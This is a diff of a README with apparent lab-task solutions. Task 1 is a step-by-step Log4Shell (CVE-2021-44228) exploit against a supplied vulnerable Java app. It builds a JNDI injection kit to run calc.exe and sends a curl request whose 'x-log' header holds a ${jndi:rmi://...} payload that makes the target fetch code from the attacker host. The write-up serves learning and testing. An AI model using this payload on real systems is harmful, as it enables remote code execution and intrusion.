@@ -2,26 +2,46 @@
 
 Solutions and instructions to reproduce of provided tasks.
 
-## Task 1 (log4j vulnerability that allows execution of remote code)
+# Task 1 (RCE using log4j vulnerability)
 
-Exploiting Log4Shell/CVE-2021-44228 vulnerability based on app provided, "vulnapp.jar"
+This guide outlines the steps to exploit a remote code execution vulnerability in a Java web application using the log4shell (CVE-2021-44228) vulnerability.
 
+### Task Overview
 
+The task involves exploiting a vulnerability in the application's log4j library to execute remote code on the target system.
 
+### Environment Setup
 
+- Operating System: Ubuntu 22.04.3 LTS 
+- Java Runtime Environment (JRE) version 8
+- JNDI Injection Exploit Kit for RCE exploit (https://github.com/welk1n/JNDI-Injection-Exploit) -> mvn to build (optional)
+- Target system: Windows 11
 
+### Approach and Solution
 
+The solution exploits the log4shell vulnerability by injecting a malicious payload via the "x-log" header, leading to remote code execution on the target system.
 
+### Exploitation Steps
 
+1. **Start the Vulnerable Application**: Launch the vulnerable web application (`vulnapp.jar`) on the target system.
 
+  ``` java -jar vulnapp.jar```
 
+3. **Prepare the Exploit Kit**: Build and launch the JNDI Injection Exploit Kit on the attacker host with the desired payload (e.g., `calc.exe` for Windows).
 
+ ``` java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'calc.exe' ```
 
+5. **Craft the Payload**: Construct the payload to be injected through the "x-log" header, leveraging the JNDI Injection Exploit Kit's capabilities.
 
+6. **Trigger the Exploit**: Send the crafted payload to the vulnerable application via curl or similar tools, exploiting the log4shell vulnerability.
 
+ ``` curl http://<IP-ADDRESS>:8888/app/servlet -H 'x-log: ${jndi:rmi://<WSL-IP>:1099/<RMI lookup value as provided by Injection Exploit>}' ```
 
+7. **Verify Remote Code Execution**: Upon successful exploitation, the payload should execute on the target system, demonstrating remote code execution.
 
+### Demonstration of RCE
 
+[![RCE demonstration](https://img.youtube.com/vi/NmcQrE_JIGw/0.jpg)](https://www.youtube.com/watch?v=NmcQrE_JIGw)
 
 ## Task 2
 
